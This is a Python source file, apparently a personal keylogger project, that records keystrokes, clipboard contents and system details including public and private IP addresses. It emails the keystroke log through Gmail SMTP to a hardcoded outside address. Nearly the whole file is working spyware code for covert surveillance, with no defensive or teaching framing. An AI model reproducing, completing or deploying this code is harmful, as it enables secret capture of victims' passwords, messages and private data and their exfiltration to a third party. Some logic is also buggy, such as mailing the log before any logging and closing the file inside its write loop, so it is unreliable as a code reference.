## Library Imports
# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# System Info
import socket
import platform
from email.quoprimime import body_check

# Clipboard
import win32clipboard
from cryptography.x509 import IPAddress

# Keys and Listener
from pynput.keyboard import Key, Listener

import time
import os
from dotenv import load_dotenv

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "keys_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"

file_path = "D:\\My GitHub\\rachit404\\python_keylogger\\MainProject\\"

load_dotenv()
fromaddr = os.getenv("EMAIL_SENDER")
password = os.getenv("GMAIL_SMTP_PASSWORD")
# print("Password: ",password)
toaddr = "tempmail8user@gmail.com"

def send_mail(filename, attachment, toaddr):
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body Of The Mail"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
send_mail(keys_information, file_path+keys_information, toaddr)

def computer_information():
    with open(file_path+system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: "+public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("\nProcessor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddress + "\n")
computer_information()

def copy_clipboard():
    with open(file_path + clipboard_information, "a" ) as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")
copy_clipboard()

count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            # else:  # Key.ctrl_lKey.alt_l
            elif k.find("Key") == -1:
                f.write(k)
            f.close()

def on_release(key):
    return False if key == Key.esc else True

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()





















